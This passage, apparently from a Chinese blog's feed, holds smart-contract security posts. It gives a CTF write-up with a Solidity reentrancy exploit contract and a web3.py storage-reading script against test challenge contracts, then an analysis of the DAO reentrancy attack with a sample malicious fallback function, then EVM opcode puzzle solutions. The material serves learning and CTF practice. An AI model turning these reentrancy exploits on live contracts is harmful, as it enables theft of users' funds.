argument&quot;</span>)</span><br></pre></td></tr></table></figure><p>而 secret 可以利用 web3js 在storage获取。</p><p>在<code>withdraw</code>函数中存在重入漏洞，但是要执行该函数需要满足<code>require(balance[msg.sender] &gt;= amount);</code>，在调用完<code>profit</code>和<code>guess</code>函数后的<code>balance[msg.sender]== 2</code>，可以通过<code>withdraw</code>的检查，但是由于合约中没有余额，所以需要<code>selfdestruct</code>函数强制转入俩个 ether。</p><p>攻击合约：</p><p>也可以在 <a href="https://vanity-eth.tk/">https://vanity-eth.tk/</a> 生成满足条件的账户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit&#123;</span><br><span class="line">    address babybank_addr = 0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c;</span><br><span class="line">    uint flag = 0;</span><br><span class="line">    babybank public hack;</span><br><span class="line">  </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        hack = babybank(babybank_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        hack.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function() payable public&#123;</span><br><span class="line">        if (flag == 0)&#123;</span><br><span class="line">            flag = 1;</span><br><span class="line">            hack.withdraw(2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        hack.payforflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用生成的账户调用<code>profit</code>函数，在使用 webpy 获取到 slot 2中的 secret 的值后调用<code>guess</code>函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, EthereumTesterProvider</span><br><span class="line"></span><br><span class="line">web = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://ropsten.infura.io/v3/token&#x27;</span>))</span><br><span class="line">checkConnect = web.isConnected()</span><br><span class="line">web3 = web.eth</span><br><span class="line">address = <span class="string">&quot;0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c&quot;</span></span><br><span class="line">st = Web3.toHex(web3.get_storage_at(address, <span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(st)</span><br><span class="line"></span><br><span class="line">//<span class="number">0x0000000000000000000000000000000000000000000000000003fde42988fa35</span></span><br></pre></td></tr></table></figure><p>此时生成的账户中的 <code>balance[EOA] == 2</code>，然后部署攻击合约，调用 <code>transfer</code>函数，使<code>balacne[Exploit]== 2</code>，然后在调用攻击合约的 <code>withdraw</code>函数，在攻击合约第一次接收到转账时发生重入，然后利用溢出漏洞达到获取到flag的条件。</p><h3 id="storage"><a href="#storage" class="headerlink" title="storage"></a>storage</h3><h4 id="Happy-DOuble-Eleven"><a href="#Happy-DOuble-Eleven" class="headerlink" title="Happy_DOuble_Eleven"></a>Happy_DOuble_Eleven</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">interface Tmall &#123;</span><br><span class="line">    function Chop_hand(uint) view public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Happy_DOuble_Eleven &#123;</span><br><span class="line">    </span><br><span class="line">    address public owner;</span><br><span class="line">    bool public have_money;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    bool public have_chopped;</span><br><span class="line">    uint public hand;</span><br><span class="line">    </span><br><span class="line">    mapping (address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping (address =&gt; uint) public mycart;</span><br><span class="line">    mapping (address =&gt; uint) public level;</span><br><span class="line">    </span><br><span class="line">    event pikapika_SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) onlyOwner public &#123;</span><br><span class="line">        require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">        require(level[msg.sender] == 3);</span><br><span class="line">        require(mycart[msg.sender] &gt; 10000000000000000000);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        level[msg.sender] = 0;</span><br><span class="line">        have_chopped = false;</span><br><span class="line">        have_money = false;</span><br><span class="line">        codex.length = 0;</span><br><span class="line">        emit pikapika_SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier first() &#123;</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _transfer(address _from, address _to, uint _value) internal &#123;</span><br><span class="line">        require(_to != address(0x0));</span><br><span class="line">        require(_value &gt; 0);</span><br><span class="line">        </span><br><span class="line">        uint256 oldFromBalance = balanceOf[_from];</span><br><span class="line">        uint256 oldToBalance = balanceOf[_to];</span><br><span class="line">        </span><br><span class="line">        uint256 newFromBalance =  balanceOf[_from] - _value;</span><br><span class="line">        uint256 newToBalance =  balanceOf[_to] + _value;</span><br><span class="line">        </span><br><span class="line">        require(oldFromBalance &gt;= _value);</span><br><span class="line">        require(newToBalance &gt; oldToBalance);</span><br><span class="line">        </span><br><span class="line">        balanceOf[_from] = newFromBalance;</span><br><span class="line">        balanceOf[_to] = newToBalance;</span><br><span class="line">        </span><br><span class="line">        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">        _transfer(msg.sender, _to, _value); </span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function Deposit() public payable &#123;</span><br><span class="line">        if(msg.value &gt;= 500 ether)&#123;</span><br><span class="line">            mycart[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function gift() first &#123;</span><br><span class="line">        require(mycart[msg.sender] == 0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">        balanceOf[msg.sender] = 100;</span><br><span class="line">        mycart[msg.sender] += 1;</span><br><span class="line">        level[msg.sender] += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function Chopping(uint _hand) public &#123;</span><br><span class="line">        Tmall tmall = Tmall(msg.sender);</span><br><span class="line">        </span><br><span class="line">        if (!tmall.Chop_hand(_hand)) &#123;</span><br><span class="line">            hand = _hand;</span><br><span class="line">            have_chopped = tmall.Chop_hand(hand);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function guess(uint num) public &#123;</span><br><span class="line">        uint seed = uint(blockhash(block.number - 1));</span><br><span class="line">        uint rand = seed % 3;</span><br><span class="line">        if (rand == num) &#123;</span><br><span class="line">            have_money = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        require(level[msg.sender] == 1);</span><br><span class="line">        require(mycart[msg.sender] == 1);</span><br><span class="line">        require(have_chopped == true);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        mycart[msg.sender] += 1;</span><br><span class="line">        level[msg.sender] += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function retract() public &#123;</span><br><span class="line">        require(codex.length == 0);</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 2);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        codex.length -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function revise(uint i, bytes32 _person) public &#123;</span><br><span class="line">        require(codex.length &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000);</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 2);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        codex[i] = _person;</span><br><span class="line">        if (codex.length &lt; 0xffffffffff000000000000000000000000000000000000000000000000000000)&#123;</span><br><span class="line">            codex.length = 0;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            level[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint _amount) onlyOwner public &#123;</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 3);</span><br><span class="line">        require(_amount &gt;= 100);</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= _amount);</span><br><span class="line">        require(address(this).balance &gt;= _amount);</span><br><span class="line">        balanceOf[msg.sender] -= _amount;</span><br><span class="line">        msg.sender.call.value(_amount)();</span><br><span class="line">        mycart[msg.sender] -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>payforlag</code>函数中是获取flag的条件，要求<code>msg.sender</code>的低位为<code>0x111</code>，<code>lelve[msgs.sender] == 3</code>，且账户的余额大于 10000000000000000000。</p><p><code>Deposit</code>函数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;integer-overflow&quot;&gt;&lt;a href=&quot;#integer-overflow&quot; class=&quot;headerlink&quot; title=&quot;integer overflow&quot;&gt;&lt;/a&gt;integer overflow&lt;/h3&gt;&lt;h4 id=&quot;bet&quot;&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="智能合约 CTF" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CTF/"/>
    
  </entry>
  
  <entry>
    <title>The Dao 事件分析</title>
    <link href="https://banana69.site/2022/07/29/RaceToEmpty%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>https://banana69.site/2022/07/29/RaceToEmpty%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</id>
    <published>2022-07-29T08:55:14.000Z</published>
    <updated>2022-07-29T10:30:55.208Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Race-To-Empty-攻击简介"><a href="#Race-To-Empty-攻击简介" class="headerlink" title="Race To Empty 攻击简介"></a>Race To Empty 攻击简介</h3><p>Race To Empty 就是使用多次且快速调用代码的方式使被攻击者账户中的资产为空的一种攻击方式，利用 <code>fallback()</code>函数使受害者递归调用转账函数，也就是我们现在说的重入攻击 </p><p>举个例子来理解：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawBalance() &#123;  </span><br><span class="line">  amountToWithdraw = userBalances[msg.sender];</span><br><span class="line">  if (!(msg.sender.call.value(amountToWithdraw)())) &#123; </span><br><span class="line">  throw;</span><br><span class="line">  &#125;</span><br><span class="line">  userBalances[msg.sender] = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是一个普通的取款函数，在被调用时会执行以下操作</p><ol><li>获取记录的余额<code>userBalances[msg.sender]</code></li><li>将获取到的余额发送，若发送不成功则抛出异常</li><li>将 <code>msg.sender</code>的余额置为 0</li></ol><p>以上操作看起来没有任何问题，实际上在智能合约上执行时，转账接收者在合约中可以写一段恶意代码，比如像这样的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function () &#123;  </span><br><span class="line">  // To be called by a vulnerable contract with a withdraw function.</span><br><span class="line">  // This will double withdraw.</span><br><span class="line"></span><br><span class="line">  vulnerableContract v;</span><br><span class="line">  uint times;</span><br><span class="line">  if (times == 0 &amp;&amp; attackModeIsOn) &#123;</span><br><span class="line">    times = 1;</span><br><span class="line">    v.withdrawBalance();</span><br><span class="line"></span><br><span class="line">   &#125; else &#123; times = 0; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在每次调用<code>msg.sender.call.value()</code>就会调用默认函数，而默认函数又会去调用 <code>withdrawBalance()</code>，这样就会造成递归调用，函数调用栈如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vulnerableContract.withdrawBalance run 1</span><br><span class="line">attacker default function run 1</span><br><span class="line">vulnerableContract.withdrawBalance run 2</span><br><span class="line">attacker default function run 2</span><br></pre></td></tr></table></figure><p>当第一次调用<code>userBalances[msg.sender]</code>会正常执行下面的转账操作，当第二次调用时还为执行置 0 操作，就会不断的向攻击者转账，耗尽被攻击者的余额。</p><h3 id="The-Dao-事件中的重入攻击"><a href="#The-Dao-事件中的重入攻击" class="headerlink" title="The Dao 事件中的重入攻击"></a>The Dao 事件中的重入攻击</h3><h5 id="fallback函数"><a href="#fallback函数" class="headerlink" title="fallback函数"></a>fallback函数</h5><p>fallback 函数又被称为回退函数，每个合约具有一个没有名字的函数，当合约被调用时，如果无法匹配到有效的函数，就会默认调用 <code>fallback</code>函数；当合约接收到 ether 时 ，会退函数也会被执行。</p><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>DAO被攻击成功主要有俩个原因：</p><ol><li>DAO余额扣除与转账顺序有误，应该先进行扣除费用再进行转账；</li><li>未知代码被无限制使用。</li></ol><p>攻击者在自己的合约中，利用 fallback 函数通过递归初查 DAO 的splitDAO 函数的多次调用。</p><p>源码分析：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Modifier that allows only shareholders to vote and create new proposals</span><br><span class="line">    modifier onlyTokenholders &#123;</span><br><span class="line">        if (balanceOf(msg.sender) == 0) throw;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上面的代码对 <code>msg.sender</code>持有的 dao token 进行判断，当余额为 0 时会抛出异常。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Move ether and assign new Tokens</span><br><span class="line">uint fundsToBeMoved =(balances[msg.sender] * p.splitData[0].splitBalance) / p.splitData[0].totalSupply;</span><br><span class="line">if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false)</span><br><span class="line">throw;</span><br></pre></td></tr></table></figure><p>在 DAO.sol 中的 splitDao可以找到向 childDAo 转账的代码，它会将代币从 the parent DAO 转移到 the child DAO中。攻击者就是利用这条语句来获取更多的代币并转移到 child DAO 中。</p><p><strong>fundsToBeMoved</strong> 的作用是决定了要转移的代币的数量，因为攻击者每次调用时 <code>p.splitData[0]</code>都是一样的，并且<code>p.splitData[0].totalSupply</code>与<code>balances[msg.sender]</code>的值由于函数顺序问题没有被更新。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Burn DAO Tokens</span><br><span class="line">Transfer(msg.sender, 0, balances[msg.sender]);</span><br><span class="line">withdrawRewardFor(msg.sender); // be nice, and get his rewards</span><br><span class="line">totalSupply -= balances[msg.sender];</span><br><span class="line">balances[msg.sender] = 0;</span><br><span class="line">paidOut[msg.sender] = 0;</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure><p>所以要想实现不断的转账操作，就必须依靠其他方法，根据上面的代码，为msg.sender记录的dao币余额归零、扣减 dao token 总量totalSupply等等都发生在将token转入msg.sender之后。下面看<code>withdrawRewardFor)()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawRewardFor(address _account) noEther internal returns (bool _success) &#123;</span><br><span class="line">if ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply &lt; paidOut[_account])</span><br><span class="line">throw;</span><br><span class="line">uint reward =(balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];</span><br><span class="line">if (!rewardAccount.payOut(_account, reward))</span><br><span class="line">throw;</span><br><span class="line">  paidOut[_account] += reward;</span><br><span class="line">  return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>paidOut[_account] += reward</code>在问题代码里面放在payOut函数调用之后，再看payOut函数调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function payOut(address _recipient, uint _amount) returns (bool) &#123;</span><br><span class="line">        if (msg.sender != owner || msg.value &gt; 0 || (payOwnerOnly &amp;&amp; _recipient != owner))</span><br><span class="line">            throw;</span><br><span class="line"></span><br><span class="line">        if (_recipient.call.value(_amount)()) &#123;    //注意这一行</span><br><span class="line"></span><br><span class="line">            PayOut(_recipient, _amount);</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对_recipient发出call调用，转账_amount个Wei，call调用默认会使用当前剩余的所有gas。</p><p>以上就是 DAO 事件的代码分析。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Race-To-Empty-攻击简介&quot;&gt;&lt;a href=&quot;#Race-To-Empty-攻击简介&quot; class=&quot;headerlink&quot; title=&quot;Race To Empty 攻击简介&quot;&gt;&lt;/a&gt;Race To Empty 攻击简介&lt;/h3&gt;&lt;p&gt;Race T</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Evm-puzzles题解</title>
    <link href="https://banana69.site/2022/07/28/evm-puzzles/"/>
    <id>https://banana69.site/2022/07/28/evm-puzzles/</id>
    <published>2022-07-27T16:00:00.000Z</published>
    <updated>2022-07-28T07:01:08.830Z</updated>
    
    <content type="html"><![CDATA[<p>Evm-puzzles 是一个以太坊操作码的挑战，每道题都会提供一些列操作码，并提示输入正确的交易值或者调用数据。通过Evm-puzzles可以了解EVM操作码的运行机制</p><p><img src="/image/evm-puzzles.assets/1.png" alt="1"></p><h3 id="Puzzle-1"><a href="#Puzzle-1" class="headerlink" title="Puzzle 1"></a>Puzzle 1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 1 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      5B      JUMPDEST</span><br><span class="line">09      00      STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: (0)</span><br></pre></td></tr></table></figure><p>这道题提示需要输入一个发送的值，即向这个合约发送一笔交易，这个交易需要多少value才能不处罚 REVERT指令。</p><p>首先需要了解 CALLVALUE 指令，此操作会获取到负责此执行的指令/交易的值，并将该值推到堆栈的顶部，如果输入10，则在 CALLVALUE 指令执行后，堆栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">10</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>而 JUMP 的指令的作用是更改程序计数器，使栈顶的值 n 出栈，并跳转到第 n 条执行，JUMP 执行的跳转必须以 JUMPDEST 指令结束。</p><p>所以要想通过这道题，只需要输入 value 为8，CALLVALUE 指令将 8 压入栈顶，栈中结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当执行到 JUMP 指令时栈顶的值为 8，然后跳转到第 8 条指令即 JUMPDEST，跳过所有 REVERT指令。</p><h3 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 2 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      03      SUB</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      5B      JUMPDEST</span><br><span class="line">07      00      STOP</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br></pre></td></tr></table></figure><p>这道题依然需要输入一个值，使程序在不执行 REVERT 指令的前提下运行。首先需要了解 CODESIZE 指令，此操作码获取在当前环境中运行的代码的大小。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Add some instructions to increase the code size</span></span><br><span class="line">PUSH29 <span class="number">0</span></span><br><span class="line">POP</span><br><span class="line">CODESIZE</span><br><span class="line"></span><br><span class="line"><span class="comment">//stack =&gt; 20</span></span><br></pre></td></tr></table></figure><p>puzzle2 中，可以通过查看序列有多少操作码来手动剪擦好代码的大小，每个操作码的大小是 1 byte，所以10个操作码的大小一共是 10 byte，而 EVM 中使用十六进制表示，即 0a 被压入栈顶。</p><p>SUB 指令是用栈顶元素的值减去栈中的第二个元素的值，然后将结果压入栈中，向上一题一样，如果需要跳过REVERT 指令，则需要跳转到第6条指令，由于在执行 CODESIZE 后栈顶元素的值为 0a（10） ，所以只需要使输入的值为4时，在执行 JUMP 前，栈顶元素的值为 6，即跳转到 JUMPDEST，完成该题目。</p><h3 id="Puzzle-3"><a href="#Puzzle-3" class="headerlink" title="Puzzle 3"></a>Puzzle 3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 3 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36      CALLDATASIZE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      5B      JUMPDEST</span><br><span class="line">05      00      STOP</span><br></pre></td></tr></table></figure><p>这道题目中的操作码与之前基本一致，但是需要我们输入的不是交易时的 <strong>value</strong>，而是 <strong>calldata</strong>，即附加到 message 中的字节码。<code>args</code>也叫<code>calldata</code>，Calldata是不可修改的非持久性数据位置，所有传递给函数的值都存储在这里。与栈不同的地方的是，如果要使用calldata里面的数据，必须手动指定偏移量和读取的字节数，Calldata是外部函数的参数(而不是返回参数)的默认位置。（关于 calldata 可以参考<a href="https://learnblockchain.cn/2019/10/05/evm-data%EF%BC%89">https://learnblockchain.cn/2019/10/05/evm-data）</a></p><p>CALLDATASIZE 指令获取调用数据的大小（以字节为单位），并将其压入到堆栈中。所以我们只需要输入 CALLDATASIZE 的值为 4个字节，一个字节是8位，在16进制中一个字节为2个16进制位，只需要输入<code>0x11111111</code>，CALLDATASIZE 就会返回 4 个字节，即可让接下来的 JUMP 指令跳转到 JUMPDEST，完成该题目。</p><h3 id="Puzzle-4"><a href="#Puzzle-4" class="headerlink" title="Puzzle 4"></a>Puzzle 4</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 4 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      18      XOR</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br><span class="line">0A      5B      JUMPDEST</span><br><span class="line">0B      00      STOP</span><br></pre></td></tr></table></figure><p>解决这道题需要了解 XOR 指令，该指令会将俩个数字的二进制形式按位进行异或，如 5 和 3 的异或表示为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>:<span class="number">00000000000000000000000000000101</span></span><br><span class="line"><span class="number">3</span>:<span class="number">00000000000000000000000000000011</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span> xor <span class="number">3</span>:<span class="number">00000000000000000000000000000110</span></span><br></pre></td></tr></table></figure><p>分析题目需要跳转到 JUMPDEST 指令，即第 10 条指令，意味着在执行 XOR 后栈顶的元素为 10(0A),，而 CODESIZE 执行后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0c your_input <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以当 0c 和 输入的值进行异或后得到的值为 0a，所以需要输入的值为 0a xor 0c == 6，即可完成该题目。</p><h3 id="Puzzle-5"><a href="#Puzzle-5" class="headerlink" title="Puzzle 5"></a>Puzzle 5</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 5 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34          CALLVALUE</span><br><span class="line">01      80          DUP1</span><br><span class="line">02      02          MUL</span><br><span class="line">03      610100      PUSH2 0100</span><br><span class="line">06      14          EQ</span><br><span class="line">07      600C        PUSH1 0C</span><br><span class="line">09      57          JUMPI</span><br><span class="line">0A      FD          REVERT</span><br><span class="line">0B      FD          REVERT</span><br><span class="line">0C      5B          JUMPDEST</span><br><span class="line">0D      00          STOP</span><br><span class="line">0E      FD          REVERT</span><br><span class="line">0F      FD          REVERT</span><br></pre></td></tr></table></figure><p>首先需要学习几个新的指令，<strong>DUP</strong> 指令表示复制栈顶上第一个位置的值，并将其压入栈顶，同样，dup2表示将栈中第二个位置的值复制并压入栈顶。dup指令包括dup1-dup16；<strong>MUL</strong>指令表示获取栈中的前俩个值，将他们相乘的结果压入栈顶；<strong>EQ</strong>指令表示获取栈中前俩个位置的值并比较运行结果，当运行结果相同时返回1，否则返回0，并将返回的结果压入栈顶。</p><p>在执行 DUP1 后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[your_input your_input <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 MUL 操作，将前俩个值相乘，并将结果压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[mul_result <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>此时执行 PUSH2 0100，将2个字节的十六进制数0100（256）压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0100</span> mul_result <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 EQ 操作，判断堆栈上的前俩个值，比较其值是否相同，假设相等，将 1压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行  PUSH1 0，它将 <code>0c</code> 压入栈顶，JUMPI 表示有条件的跳转，它有俩个参数，第一个参数表示跳转的位置，第二个参数表示是否跳转，此时栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0c <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当栈中的第二个元素的值为 1 时，发生跳转，跳转到位置 0c，正好是 JUMPDEST，完成该题目。所以往上推输入的值应该是16，使 ${input}^2=256$，然后通过 EQ 判断，执行 JUMPI。</p><h3 id="Puzzle-6"><a href="#Puzzle-6" class="headerlink" title="Puzzle 6"></a>Puzzle 6</h3><figure class="highlight 